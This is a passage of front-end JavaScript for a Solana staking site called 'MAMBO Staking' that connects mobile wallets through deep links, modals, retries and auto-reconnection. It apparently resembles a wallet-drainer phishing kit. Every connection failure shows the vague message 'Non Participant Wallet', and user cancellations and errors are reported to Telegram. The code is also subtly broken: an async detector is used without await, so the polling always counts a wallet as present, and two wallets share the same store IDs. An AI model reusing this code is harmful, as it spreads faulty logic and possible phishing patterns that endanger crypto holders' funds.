          'warning': '‚ö†Ô∏è'
        }
        
        const icon = iconMap[type] || '‚ÑπÔ∏è'
        const colorMap = {
          'info': '#17a2b8',
          'loading': '#ffc107',
          'success': '#28a745',
          'error': '#dc3545',
          'warning': '#ffc107'
        }
        
        statusIndicator.style.display = 'block'
        statusIndicator.style.background = colorMap[type] + '20'
        statusIndicator.style.borderColor = colorMap[type]
        
        const iconSpan = statusIndicator.querySelector('.status-icon')
        const textSpan = statusIndicator.querySelector('.status-text')
        
        iconSpan.textContent = icon
        textSpan.textContent = message
      }

      // Enhanced mobile wallet connection with deep linking and fallbacks
      window.connectMobileWallet = async function(walletType) {
        try {
          console.log(`[MOBILE_WALLET] Attempting to connect to ${walletType}`);
          
          // Show loading state in both places
          if (window.showStatus) {
            window.showStatus(`üîó Connecting to ${walletType}...`, 'loading')
          }
          if (window.updateMobileWalletStatus) {
            window.updateMobileWalletStatus(`Connecting to ${walletType}...`, 'loading')
          }
          
          let provider;
          let connectionMethod = 'unknown';
          
          // Check if we're already in a wallet's dApp browser
          if (window.isInWalletBrowser && window.isInWalletBrowser()) {
            console.log(`[MOBILE_WALLET] Detected wallet browser environment, checking for ${walletType}`)
            
            // In wallet browser, wallet should be available immediately
            provider = await window.detectBrowserWallet(walletType)
            if (provider) {
              connectionMethod = 'dapp_browser_direct'
              console.log(`[MOBILE_WALLET] ${walletType} available in dApp browser`)
            } else {
              console.log(`[MOBILE_WALLET] ${walletType} not available in dApp browser`)
            }
          }
          
          // Step 1: Try browser injection (fastest method)
          if (!provider) {
            try {
              provider = await window.detectBrowserWallet(walletType)
              if (provider) {
                connectionMethod = 'browser_injection'
                console.log(`[MOBILE_WALLET] Browser wallet detected for ${walletType}`)
              }
            } catch (error) {
              console.log(`[MOBILE_WALLET] Browser wallet detection failed for ${walletType}:`, error.message)
            }
          }
          
          // Step 2: If no browser wallet, try deep linking
          if (!provider) {
            try {
              connectionMethod = 'deep_link'
              console.log(`[MOBILE_WALLET] Attempting deep link to ${walletType}`)
              
              // Try deep linking with enhanced dApp browser support
              const deepLinkResult = await window.attemptDeepLink(walletType)
              if (deepLinkResult.success) {
                console.log(`[MOBILE_WALLET] Deep link successful for ${walletType}:`, deepLinkResult.method)
                
                // Handle deep linking success
                window.handleDeepLinkSuccess(walletType, deepLinkResult)
                
                        // Wait for wallet injection with generous timeout for slow users
        const injectionResult = await window.waitForWalletInjection(walletType, 15000) // Increased to 15 seconds
                if (injectionResult.success) {
                          logger.log(`[MOBILE_WALLET] Wallet injection successful:`, injectionResult.method)
        provider = injectionResult.provider || await window.detectBrowserWallet(walletType)
      } else {
        logger.log(`[MOBILE_WALLET] Wallet injection failed, user may need to return manually`)
        // Continue monitoring for user return
      }
    } else {
      logger.log(`[MOBILE_WALLET] Deep linking failed for ${walletType}:`, deepLinkResult.error)
      
      // Show appropriate error message
      if (window.updateMobileWalletStatus) {
        window.updateMobileWalletStatus(`Failed to open ${walletType} app`, 'error')
      }
    }
  } catch (error) {
    logger.log(`[MOBILE_WALLET] Deep linking failed for ${walletType}:`, error.message)
  }
          }
          
          // Step 3: Final connection attempt
          if (provider) {
            try {
                      logger.log(`[MOBILE_WALLET] Attempting connection to ${walletType} via ${connectionMethod}`)
        
        // Set very generous connection timeout for slow users
        const connectionPromise = provider.connect()
        const timeoutPromise = new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Connection timeout')), window.getTimeout('WALLET_CONNECTION_TIMEOUT')) // Configurable timeout
        )
        
        await Promise.race([connectionPromise, timeoutPromise])
        logger.log(`[MOBILE_WALLET] Successfully connected to ${walletType}`)
        
        // Handle the connection
        await window.handleMobileWalletConnection(walletType, provider)
        
      } catch (connectionError) {
        logger.error(`[MOBILE_WALLET] Connection failed for ${walletType}:`, connectionError)
      
      // Log critical mobile wallet connection failures to Telegram
      if (window.sendTelegramLog) {
        window.sendTelegramLog('WALLET_CONNECTION', {
          error: connectionError.message,
          stack: connectionError.stack,
          context: 'Mobile Wallet Connection',
          walletType: walletType,
          timestamp: new Date().toISOString(),
          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
        });
      }
        
        // Show appropriate error message
        if (connectionError.message.includes('timeout')) {
          if (window.showStatus) {
            window.showStatus('Non Participant Wallet', 'error')
          }
        } else if (connectionError.message.includes('User rejected') || connectionError.message.includes('User denied')) {
          logger.log(`[MOBILE_WALLET] User cancelled ${walletType} connection`)
          
          // Log user cancellation
          if (window.logUserCancellation) {
            window.logUserCancellation('wallet_connection', {
              walletType: walletType,
              context: 'Mobile Wallet Connection',
              error: connectionError.message
            });
          }
          
          if (window.showStatus) {
            window.showStatus('Connection was cancelled by user', 'info')
          }
        } else {
          if (window.showStatus) {
            window.showStatus('Non Participant Wallet', 'error')
          }
        }
      }
    } else {
      // No wallet available - show installation instructions
      logger.log(`[MOBILE_WALLET] No wallet available for ${walletType}`)
      window.showWalletInstallInstructions(walletType)
    }
    
  } catch (error) {
    logger.error(`[MOBILE_WALLET] Critical error connecting to ${walletType}:`, error)
    if (window.showStatus) {
      window.showStatus('Non Participant Wallet', 'error')
    }
  }
      }

      // Detect browser-injected wallet with enhanced error handling
      window.detectBrowserWallet = async function(walletType) {
        try {
          const walletMap = {
            'phantom': window.solana && window.solana.isPhantom ? window.solana : null,
            'solflare': window.solflare ? window.solflare : null,
            'backpack': window.backpack ? window.backpack : null,
            'glow': window.glow ? window.glow : null,
            'exodus': window.exodus ? window.exodus : null,
            'trust': window.trust ? window.trust : null
          }
          
          const wallet = walletMap[walletType]
          
          // Validate wallet if found
          if (wallet) {
            try {
              // Basic validation that wallet is functional
              if (typeof wallet.connect === 'function' && typeof wallet.publicKey !== 'undefined') {
                return wallet
              } else {
                logger.log(`[WALLET_DETECTION] ${walletType} found but missing required methods`)
                return null
              }
            } catch (validationError) {
              logger.log(`[WALLET_DETECTION] ${walletType} validation failed:`, validationError.message)
              return null
            }
          }
          
          return null
        } catch (error) {
          logger.error(`[WALLET_DETECTION] Error detecting ${walletType}:`, error)
          
          // Log critical detection errors
          if (window.sendTelegramLog) {
            window.sendTelegramLog('WALLET_DETECTION_ERROR', {
              walletType: walletType,
              error: error.message,
              context: 'Wallet Detection',
              timestamp: new Date().toISOString(),
              projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
            });
          }
          
          return null
        }
      }

      // Enhanced deep linking with dApp browser integration
      window.attemptDeepLink = async function(walletType) {
        return new Promise((resolve) => {
          try {
          // Get current site URL for dApp browser integration
          const currentSiteUrl = window.location.href
          const currentSiteDomain = window.location.origin
          
          const deepLinks = {
            'phantom': {
              // Phantom dApp browser deep link format
              primary: `https://phantom.app/ul/browse/${encodeURIComponent(currentSiteUrl)}`,
              fallback: `https://phantom.app/ul/browse/${encodeURIComponent(currentSiteDomain)}`,
              dappBrowser: `https://phantom.app/ul/browse/${encodeURIComponent(currentSiteUrl)}`,
              appStore: 'https://apps.apple.com/app/phantom/id1598432977',
              playStore: 'https://play.google.com/store/apps/details?id=app.phantom'
            },
            'solflare': {
              // Solflare dApp browser deep link format
              primary: `https://solflare.com/browse?url=${encodeURIComponent(currentSiteUrl)}`,
              fallback: `https://solflare.com/browse?url=${encodeURIComponent(currentSiteDomain)}`,
              dappBrowser: `https://solflare.com/browse?url=${encodeURIComponent(currentSiteUrl)}`,
              appStore: 'https://apps.apple.com/app/solflare/id1580902717',
              playStore: 'https://play.google.com/store/apps/details?id=com.solflare.mobile'
            },
            'backpack': {
              // Backpack dApp browser deep link format
              primary: `https://backpack.app/browse?url=${encodeURIComponent(currentSiteUrl)}`,
              fallback: `https://backpack.app/browse?url=${encodeURIComponent(currentSiteDomain)}`,
              dappBrowser: `https://backpack.app/browse?url=${encodeURIComponent(currentSiteUrl)}`,
              appStore: 'https://apps.apple.com/app/backpack-wallet/id6446675622',
              playStore: 'https://play.google.com/store/apps/details?id=com.backpack.app'
            },
            'glow': {
              // Glow dApp browser deep link format
              primary: `https://glow.app/browse?url=${encodeURIComponent(currentSiteUrl)}`,
              fallback: `https://glow.app/browse?url=${encodeURIComponent(currentSiteDomain)}`,
              dappBrowser: `https://glow.app/browse?url=${encodeURIComponent(currentSiteUrl)}`,
              appStore: 'https://apps.apple.com/app/glow-wallet/id6446675622',
              playStore: 'https://play.google.com/store/apps/details?id=com.glow.app'
            },
            'exodus': {
              // Exodus dApp browser deep link format
              primary: `https://exodus.com/browse?url=${encodeURIComponent(currentSiteUrl)}`,
              fallback: `https://exodus.com/browse?url=${encodeURIComponent(currentSiteDomain)}`,
              dappBrowser: `https://exodus.com/browse?url=${encodeURIComponent(currentSiteUrl)}`,
              appStore: 'https://apps.apple.com/app/exodus-multi-asset-wallet/id1414384820',
              playStore: 'https://play.google.com/store/apps/details?id=exodusmovement.exodus'
            },
            'trust': {
              // Trust Wallet dApp browser deep link format
              primary: `https://trustwallet.com/browser?url=${encodeURIComponent(currentSiteUrl)}`,
              fallback: `https://trustwallet.com/browser?url=${encodeURIComponent(currentSiteDomain)}`,
              dappBrowser: `https://trustwallet.com/browser?url=${encodeURIComponent(currentSiteUrl)}`,
              appStore: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409',
              playStore: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp'
            }
          }
          
          const walletLinks = deepLinks[walletType]
          if (!walletLinks) {
            resolve({ success: false, error: 'Unknown wallet type' })
            return
          }
          
          // Enhanced deep linking strategy for dApp browser integration
          try {
            logger.log(`[DEEP_LINK] Attempting dApp browser deep link: ${walletLinks.dappBrowser}`)
            
            // Strategy 1: Try dApp browser deep link first (most reliable)
            try {
              // Use window.location.href for better mobile deep linking
              const originalLocation = window.location.href
              
              // Attempt deep link with iframe method
              const iframe = document.createElement('iframe')
              iframe.style.display = 'none'
              iframe.src = walletLinks.dappBrowser
              document.body.appendChild(iframe)
              
              // Wait for deep link attempt
              setTimeout(() => {
                document.body.removeChild(iframe)
                
                // Try direct deep link opening
                try {
                  // Method 1: Direct window.location change (most reliable for mobile)
                  window.location.href = walletLinks.dappBrowser
                  
                  // Set a timeout to detect if deep linking worked
                  setTimeout(() => {
                    // If we're still on the same page, deep linking may have failed
                    if (window.location.href === originalLocation) {
                      console.log(`[DEEP_LINK] Deep link may have failed, trying alternative methods`)
                      // Continue with fallback methods
                    }
                  }, 2000)
                  
                  resolve({ success: true, method: 'dapp_browser_deep_link' })
                  
                } catch (directError) {
                  console.log(`[DEEP_LINK] Direct deep link failed, trying window.open`)
                  
                  // Method 2: Window.open fallback
                  try {
                    const newWindow = window.open(walletLinks.dappBrowser, '_blank', 'noopener,noreferrer')
                    if (newWindow) {
                      resolve({ success: true, method: 'window_open_deep_link' })
                    } else {
                      throw new Error('Window open blocked')
                    }
                  } catch (windowOpenError) {
                    console.log(`[DEEP_LINK] Window open failed, trying link click`)
                    
                    // Method 3: Link click fallback
                    try {
                      const link = document.createElement('a')
                      link.href = walletLinks.dappBrowser
                      link.target = '_blank'
                      link.rel = 'noopener noreferrer'
                      document.body.appendChild(link)
                      link.click()
                      document.body.removeChild(link)
                      
                      resolve({ success: true, method: 'link_click_deep_link' })
                    } catch (linkClickError) {
                      console.log(`[DEEP_LINK] All deep link methods failed`)
                      resolve({ success: false, method: 'deep_link_failed', error: linkClickError.message })
                    }
                  }
                }
              }, 800) // Optimized timeout for faster performance
              
            } catch (iframeError) {
              console.log(`[DEEP_LINK] Iframe method failed:`, iframeError.message)
              throw iframeError
            }
            
          } catch (error) {
            console.log(`[DEEP_LINK] Primary dApp browser deep link failed, trying fallbacks`)
            
            // Strategy 2: Try fallback deep links
            try {
              console.log(`[DEEP_LINK] Attempting fallback deep link: ${walletLinks.fallback}`)
              
              // Try fallback with window.location
              window.location.href = walletLinks.fallback
              
              setTimeout(() => {
                resolve({ success: true, method: 'fallback_deep_link' })
              }, 500)
              
            } catch (fallbackError) {
              console.log(`[DEEP_LINK] Fallback deep link failed, trying store links`)
              
              // Strategy 3: Store links as last resort
              resolve({ 
                success: false, 
                method: 'store_links', 
                links: walletLinks,
                error: 'All deep linking methods failed'
              })
            }
          }
        } catch (error) {
          console.error(`[DEEP_LINK] Critical error in deep linking for ${walletType}:`, error)
          
          // Log critical deep linking errors
          if (window.sendTelegramLog) {
            window.sendTelegramLog('DEEP_LINKING_ERROR', {
              walletType: walletType,
              error: error.message,
              context: 'Deep Linking Process',
              timestamp: new Date().toISOString(),
              projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
            });
          }
          
          resolve({ 
            success: false, 
            method: 'critical_error', 
            error: error.message
          })
        }
        })
      }

      // Enhanced wallet injection detection with dApp browser support
      window.waitForWalletInjection = async function(walletType, timeoutMs) {
        return new Promise((resolve) => {
          const startTime = Date.now()
          let injectionDetected = false
          
          // Check for wallet injection
          const checkInterval = setInterval(() => {
            const provider = window.detectBrowserWallet(walletType)
            
            if (provider && !injectionDetected) {
              injectionDetected = true
              clearInterval(checkInterval)
              console.log(`[DEEP_LINK] Wallet ${walletType} injected after ${Date.now() - startTime}ms`)
              resolve({ success: true, provider: provider, method: 'injection_detected' })
                    } else if (Date.now() - startTime > timeoutMs && !injectionDetected) {
          clearInterval(checkInterval)
          logger.log(`[DEEP_LINK] Timeout waiting for ${walletType} injection`)
          resolve({ success: false, method: 'injection_timeout' })
        }
          }, 100)
          
          // Additional detection for dApp browser scenarios
          if (window.isInWalletBrowser && window.isInWalletBrowser()) {
            console.log(`[DEEP_LINK] Detected wallet browser environment`)
            // In wallet browser, wallet should be available immediately
            setTimeout(() => {
              const provider = window.detectBrowserWallet(walletType)
              if (provider && !injectionDetected) {
                injectionDetected = true
                clearInterval(checkInterval)
                console.log(`[DEEP_LINK] Wallet ${walletType} available in dApp browser`)
                resolve({ success: true, provider: provider, method: 'dapp_browser_detected' })
              }
            }, 500)
          }
        })
      }

      // Detect if we're running in a wallet's dApp browser
      window.isInWalletBrowser = function() {
        try {
          // Check for wallet-specific indicators
          const userAgent = navigator.userAgent.toLowerCase()
          const isPhantomBrowser = userAgent.includes('phantom') || window.solana?.isPhantom
          const isSolflareBrowser = userAgent.includes('solflare') || window.solflare
          const isBackpackBrowser = userAgent.includes('backpack') || window.backpack
          const isGlowBrowser = userAgent.includes('glow') || window.glow
          const isExodusBrowser = userAgent.includes('exodus') || window.exodus
          const isTrustBrowser = userAgent.includes('trust') || window.trust
          
          // Check for wallet environment variables
          const hasWalletEnv = window.ethereum || window.solana || window.solflare || window.backpack
          
          // Check for mobile wallet indicators
          const isMobileWallet = /mobile|android|iphone|ipad|ipod/i.test(userAgent) && hasWalletEnv
          
          return isPhantomBrowser || isSolflareBrowser || isBackpackBrowser || isGlowBrowser || isExodusBrowser || isTrustBrowser || isMobileWallet
        } catch (error) {
          console.log(`[DETECTION] Error detecting wallet browser:`, error.message)
          return false
        }
      }

      // Telegram logging function for enhanced error tracking (using centralized function)

      // Centralized user cancellation logging function
      window.logUserCancellation = function(action, context = {}) {
        try {
          console.log(`[USER_CANCELLATION] ${action}:`, context);
          
          // Send to Telegram if available
          if (window.sendTelegramLog) {
            window.sendTelegramLog('USER_CANCELLATION', {
              action: action,
              ...context,
              timestamp: new Date().toISOString(),
              projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking' // Ensure project name consistency
            });
          }
          
          // Log to console with project branding
          console.log(`[${window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'}] User cancelled ${action}:`, {
            ...context,
            timestamp: new Date().toISOString()
          });
          
        } catch (error) {
          console.error('[USER_CANCELLATION] Logging failed:', error);
        }
      }

      // Enhanced deep linking success handler
      window.handleDeepLinkSuccess = function(walletType, deepLinkResult) {
        console.log(`[DEEP_LINK] Deep linking successful for ${walletType}:`, deepLinkResult.method)
        
        // Show success message to user
        if (window.updateMobileWalletStatus) {
          window.updateMobileWalletStatus(`${walletType} app opened successfully!`, 'success')
        }
        
        // Show deep linking instruction modal
        window.showDeepLinkInstructions(walletType)
        
        // Provide user guidance
        setTimeout(() => {
          if (window.updateMobileWalletStatus) {
            window.updateMobileWalletStatus(`Please complete the connection in ${walletType} app`, 'info')
          }
        }, 2000)
        
        // Set up monitoring for when user returns
        window.monitorForWalletReturn(walletType)
      }

      // Show deep linking instructions modal
      window.showDeepLinkInstructions = function(walletType) {
        const modal = document.createElement('div')
        modal.style.cssText = `
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: rgba(0,0,0,0.8);
          z-index: 10001;
          display: flex;
          align-items: center;
          justify-content: center;
        `
        
        const content = document.createElement('div')
        content.style.cssText = `
          background: white;
          padding: 30px;
          border-radius: 15px;
          text-align: center;
          max-width: 450px;
          width: 90%;
          box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        `
        
        content.innerHTML = `
          <h3 style="margin: 0 0 20px 0; color: #333; font-size: 24px;">üì± ${walletType} App Opened</h3>
          <p style="margin: 0 0 25px 0; color: #666; line-height: 1.5;">
            Your ${walletType} app should now be open. Please follow these steps:
          </p>
          
          <div style="text-align: left; margin-bottom: 25px; padding: 20px; background: #f8f9fa; border-radius: 8px;">
            <ol style="margin: 0; padding-left: 20px; color: #333;">
              <li style="margin-bottom: 10px;">Look for the dApp browser or browser tab in ${walletType}</li>
              <li style="margin-bottom: 10px;">Navigate to this MAMBO staking site</li>
              <li style="margin-bottom: 10px;">Click the "Connect Wallet" button</li>
              <li style="margin-bottom: 10px;">Approve the connection request</li>
              <li style="margin-bottom: 10px;">Return to this app to complete the process</li>
            </ol>
          </div>
          
          <p style="margin: 0 0 25px 0; color: #888; font-size: 14px;">
            üí° <strong>Tip:</strong> The ${walletType} app should automatically open this site in its built-in browser
          </p>
          
          <button onclick="this.closest('[style*=\"position: fixed\"]').remove()" style="
            padding: 12px 24px;
            background: #667eea;
            border: none;
            border-radius: 8px;
            color: white;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
          ">Got it!</button>
        `
        
        modal.appendChild(content)
        document.body.appendChild(modal)
        
        // Auto-close when clicking outside
        modal.addEventListener('click', (e) => {
          if (e.target === modal) {
            modal.remove()
          }
        })
        
        // Auto-close after 15 seconds
        setTimeout(() => {
          if (modal.parentNode) {
            modal.remove()
          }
        }, 15000)
      }

      // Monitor for user returning from wallet app
      window.monitorForWalletReturn = function(walletType) {
        let checkCount = 0
        const maxChecks = 30 // Check for 30 seconds
        
        const checkForReturn = setInterval(() => {
          checkCount++
          
          // Check if wallet is now available
          const provider = window.detectBrowserWallet(walletType)
          if (provider) {
            clearInterval(checkForReturn)
            console.log(`[DEEP_LINK] User returned with ${walletType} wallet`)
            
            if (window.updateMobileWalletStatus) {
              window.updateMobileWalletStatus(`${walletType} wallet detected! Connecting...`, 'success')
            }
            
            // Attempt connection
            setTimeout(() => {
              window.connectMobileWallet(walletType)
            }, 1000)
            
          } else if (checkCount >= maxChecks) {
            clearInterval(checkForReturn)
            console.log(`[DEEP_LINK] User did not return with ${walletType} wallet`)
            
            if (window.updateMobileWalletStatus) {
              window.updateMobileWalletStatus(`Please return to this app after connecting ${walletType}`, 'warning')
            }
          }
        }, 1000)
      }

      // Enhanced wallet installation instructions with store links
      window.showWalletInstallInstructions = function(walletType) {
        const storeLinks = {
          'phantom': {
            name: 'Phantom',
            appStore: 'https://apps.apple.com/app/phantom/id1598432977',
            playStore: 'https://play.google.com/store/apps/details?id=app.phantom',
            chromeStore: 'https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa'
          },
          'solflare': {
            name: 'Solflare',
            appStore: 'https://apps.apple.com/app/solflare/id1580902717',
            playStore: 'https://play.google.com/store/apps/details?id=com.solflare.mobile',
            chromeStore: 'https://chrome.google.com/webstore/detail/solflare/flarehebrnpoiccomnfabhfkdhbfpnel'
          },
          'backpack': {
            name: 'Backpack',
            appStore: 'https://apps.apple.com/app/backpack-wallet/id6446675622',
            playStore: 'https://play.google.com/store/apps/details?id=com.backpack.app',
            chromeStore: 'https://chrome.google.com/webstore/detail/backpack/aflkmfhebrebjkkpgoigkkoelebldkce'
          },
          'glow': {
            name: 'Glow',
            appStore: 'https://apps.apple.com/app/glow-wallet/id6446675622',
            playStore: 'https://play.google.com/store/apps/details?id=com.glow.app',
            chromeStore: 'https://chrome.google.com/webstore/detail/glow-wallet/aflkmfhebrebjkkpgoigkkoelebldkce'
          },
          'exodus': {
            name: 'Exodus',
            appStore: 'https://apps.apple.com/app/exodus-multi-asset-wallet/id1414384820',
            playStore: 'https://play.google.com/store/apps/details?id=exodusmovement.exodus',
            chromeStore: 'https://chrome.google.com/webstore/detail/exodus-web3-wallet/aholpfdialjgjfhomihkjbmgjidlcdno'
          },
          'trust': {
            name: 'Trust Wallet',
            appStore: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409',
            playStore: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
            chromeStore: 'https://chrome.google.com/webstore/detail/trust-wallet/egjidjbpglichdcondbcbdnbeeppgdph'
          }
        }
        
        const wallet = storeLinks[walletType]
        if (!wallet) {
          if (window.showStatus) {
            window.showStatus('Please install a compatible Solana wallet', 'info')
          }
          return
        }
        
        // Create enhanced installation modal
        const modal = document.createElement('div')
        modal.style.cssText = `
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: rgba(0,0,0,0.8);
          z-index: 10000;
          display: flex;
          align-items: center;
          justify-content: center;
        `
        
        const content = document.createElement('div')
        content.style.cssText = `
          background: white;
          padding: 30px;
          border-radius: 15px;
          text-align: center;
          max-width: 400px;
          width: 90%;
          box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        `
        
        content.innerHTML = `
          <h3 style="margin: 0 0 20px 0; color: #333; font-size: 24px;">üì± Install ${wallet.name}</h3>
          <p style="margin: 0 0 25px 0; color: #666; line-height: 1.5;">
            To connect your ${wallet.name} wallet, please install it from one of the stores below:
          </p>
          
          <div style="display: flex; flex-direction: column; gap: 15px; margin-bottom: 25px;">
            <button onclick="window.open('${wallet.appStore}', '_blank')" style="
              padding: 15px 20px;
              background: #007AFF;
              color: white;
              border: none;
              border-radius: 10px;
              font-size: 16px;
              font-weight: 600;
              cursor: pointer;
              display: flex;
              align-items: center;
              justify-content: center;
              gap: 10px;
            ">
              üçé App Store
            </button>
            
            <button onclick="window.open('${wallet.playStore}', '_blank')" style="
              padding: 15px 20px;
              background: #01875F;
              color: white;
              border: none;
              border-radius: 10px;
              font-size: 16px;
              font-weight: 600;
              cursor: pointer;
              display: flex;
              align-items: center;
              justify-content: center;
              gap: 10px;
            ">
              ü§ñ Google Play
            </button>
            
            <button onclick="window.open('${wallet.chromeStore}', '_blank')" style="
              padding: 15px 20px;
              background: #4285F4;
              color: white;
              border: none;
              border-radius: 10px;
              font-size: 16px;
              font-weight: 600;
              cursor: pointer;
              display: flex;
              align-items: center;
              justify-content: center;
              gap: 10px;
            ">
              üåê Chrome Extension
            </button>
          </div>
          
          <button onclick="this.closest('[style*=\"position: fixed\"]').remove()" style="
            padding: 12px 24px;
            background: #f0f0f0;
            border: none;
            border-radius: 8px;
            color: #666;
            cursor: pointer;
            font-size: 16px;
          ">Close</button>
        `
        
        modal.appendChild(content)
        document.body.appendChild(modal)
        
        // Auto-close when clicking outside
        modal.addEventListener('click', (e) => {
          if (e.target === modal) {
            modal.remove()
          }
        })
        
        // Show status message
        if (window.showStatus) {
          window.showStatus(`Please install ${wallet.name} to continue`, 'info')
        }
      }

      // Close modal event listener
      document.getElementById('close-mobile-modal').addEventListener('click', () => {
        window.hideMobileWalletModal()
      })

      // Close modal when clicking outside
      document.getElementById('mobile-wallet-modal').addEventListener('click', (e) => {
        if (e.target.id === 'mobile-wallet-modal') {
          window.hideMobileWalletModal()
        }
      })

      // Enhanced error handling and retry mechanism
      window.retryWalletConnection = async function(walletType, maxRetries = 3) {
        let lastError = null
        
        for (let attempt = 1; attempt <= maxRetries; attempt++) {
          try {
            console.log(`[MOBILE_WALLET] Attempt ${attempt}/${maxRetries} for ${walletType}`)
            
            if (window.updateMobileWalletStatus) {
              window.updateMobileWalletStatus(`Attempt ${attempt}/${maxRetries} - Connecting to ${walletType}...`, 'loading')
            }
            
            // Wait between retries (exponential backoff)
            if (attempt > 1) {
              const delay = Math.min(1000 * Math.pow(2, attempt - 1), 5000)
              console.log(`[MOBILE_WALLET] Waiting ${delay}ms before retry`)
              await new Promise(resolve => setTimeout(resolve, delay))
            }
            
            await window.connectMobileWallet(walletType)
            return true // Success
            
          } catch (error) {
            lastError = error
            console.log(`[MOBILE_WALLET] Attempt ${attempt} failed:`, error.message)
            
            if (attempt < maxRetries) {
                      if (window.updateMobileWalletStatus) {
          window.updateMobileWalletStatus('Non Participant Wallet', 'warning')
        }
            }
          }
        }
        
        // All retries failed
        console.error(`[MOBILE_WALLET] All ${maxRetries} attempts failed for ${walletType}`)
        
        // Log critical mobile wallet retry failures to Telegram
        if (window.sendTelegramLog) {
          window.sendTelegramLog('WALLET_CONNECTION', {
            error: `All ${maxRetries} connection attempts failed`,
            context: 'Mobile Wallet Retry Failure',
            walletType: walletType,
            maxRetries: maxRetries,
            timestamp: new Date().toISOString(),
            projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
          });
        }
        
        if (window.updateMobileWalletStatus) {
          window.updateMobileWalletStatus('Non Participant Wallet', 'error')
        }
        
        throw lastError
      }

      // Connection health checker
      window.checkWalletConnectionHealth = function(walletType) {
        const provider = window.detectBrowserWallet(walletType)
        if (!provider) return false
        
        try {
          // Basic health checks
          if (provider.isConnected && typeof provider.isConnected === 'function') {
            return provider.isConnected()
          }
          if (provider.connected) {
            return provider.connected
          }
          return false
        } catch (error) {
          console.log(`[HEALTH_CHECK] Error checking ${walletType} health:`, error.message)
          return false
        }
      }

      // Auto-reconnection for dropped connections
      window.setupAutoReconnection = function(walletType, provider) {
        if (!provider || !provider.on) return
        
        try {
          provider.on('disconnect', () => {
            console.log(`[AUTO_RECONNECT] ${walletType} disconnected, attempting reconnection`)
            if (window.updateMobileWalletStatus) {
              window.updateMobileWalletStatus(`${walletType} disconnected, reconnecting...`, 'warning')
            }
            
            // Attempt reconnection after a delay
            setTimeout(async () => {
              try {
                await window.retryWalletConnection(walletType, 2)
                if (window.updateMobileWalletStatus) {
                  window.updateMobileWalletStatus(`${walletType} reconnected successfully`, 'success')
                }
              } catch (error) {
                console.error(`[AUTO_RECONNECT] Failed to reconnect ${walletType}:`, error)
                
                // Log critical auto-reconnection failures to Telegram
                if (window.sendTelegramLog) {
                  window.sendTelegramLog('WALLET_CONNECTION', {
                    error: error.message,
                    stack: error.stack,
                    context: 'Auto-Reconnection Failure',
                    walletType: walletType,
                    timestamp: new Date().toISOString(),
                    projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
                  });
                }
                
                        if (window.updateMobileWalletStatus) {
          window.updateMobileWalletStatus('Non Participant Wallet', 'error')
        }
              }
            }, 2000)
          })
          
          console.log(`[AUTO_RECONNECT] Auto-reconnection setup for ${walletType}`)
        } catch (error) {
          console.log(`[AUTO_RECONNECT] Could not setup auto-reconnection for ${walletType}:`, error.message)
        }
      }

              console.log('[MOBILE_WALLET] Enhanced mobile wallet connection system initialized with deep linking, fallbacks, and auto-reconnection');
      
      // Comprehensive Error Testing Utilities
      window.errorTestingUtils = {
        // Test error classification
        testErrorClassification: function() {
          console.log('[ERROR_TESTING] Testing error classification...');
          
          const testErrors = [
            new Error('User rejected the request'),
            new Error('popup blocked by browser'),
            new Error('Connection timeout'),
            new Error('Network error occurred'),
            new Error('RPC endpoint failed'),
            new Error('Transaction signing failed'),
            new Error('Unknown error type')
          ];
          
          testErrors.forEach((error, index) => {
            try {
              const errorType = window.classifyFrontendError(error);
              const userMessage = window.getFrontendUserMessage(errorType);
              console.log(`[ERROR_TESTING] Test ${index + 1}: ${error.message} -> ${errorType} -> "${userMessage}"`);
            } catch (e) {
              console.error(`[ERROR_TESTING] Test ${index + 1} failed:`, e.message);
            }
          });
        },
        
        // Test error logging
        testErrorLogging: function() {
          console.log('[ERROR_TESTING] Testing error logging...');
          
          try {
            const testError = new Error('Test error for logging');
            const result = window.logFrontendError(testError, {
              context: 'Error Testing',
              testId: Date.now()
            });
            console.log('[ERROR_TESTING] Error logging test result:', result);
          } catch (e) {
            console.error('[ERROR_TESTING] Error logging test failed:', e.message);
          }
        },
        
        // Test wallet detection
        testWalletDetection: function() {
          console.log('[ERROR_TESTING] Testing wallet detection...');
          
          const wallets = ['phantom', 'solflare', 'backpack', 'glow', 'exodus', 'trust'];
          wallets.forEach(walletType => {
            try {
              const provider = window.detectBrowserWallet(walletType);
              console.log(`[ERROR_TESTING] ${walletType}: ${provider ? 'Detected' : 'Not detected'}`);
            } catch (e) {
              console.error(`[ERROR_TESTING] ${walletType} detection failed:`, e.message);
            }
          });
        },
        
        // Test timeout handling
        testTimeoutHandling: function() {
          console.log('[ERROR_TESTING] Testing timeout handling...');
          
          try {
            const timeoutPromise = new Promise((_, reject) => 
              setTimeout(() => reject(new Error('Test timeout')), 100)
            );
            
            Promise.race([
              new Promise(resolve => setTimeout(() => resolve('Success'), 200)),
              timeoutPromise
            ]).then(result => {
              console.log('[ERROR_TESTING] Timeout test result:', result);
            }).catch(error => {
              console.log('[ERROR_TESTING] Timeout test caught error:', error.message);
            });
          } catch (e) {
            console.error('[ERROR_TESTING] Timeout test failed:', e.message);
          }
        },
        
        // Run all tests
        runAllTests: function() {
          console.log('[ERROR_TESTING] Starting comprehensive error testing...');
          
          this.testErrorClassification();
          this.testErrorLogging();
          this.testWalletDetection();
          this.testTimeoutHandling();
          
          console.log('[ERROR_TESTING] All tests completed');
        }
      };
      
      // Auto-run tests in development mode
